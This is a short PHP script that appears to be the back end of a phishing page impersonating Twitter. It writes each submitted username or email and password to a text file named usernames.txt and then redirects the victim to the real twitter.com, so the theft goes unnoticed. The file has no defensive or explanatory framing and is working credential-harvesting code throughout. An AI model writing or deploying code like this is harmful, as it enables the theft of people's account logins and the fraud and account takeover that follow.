<?php

file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['usernameOrEmail'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/');

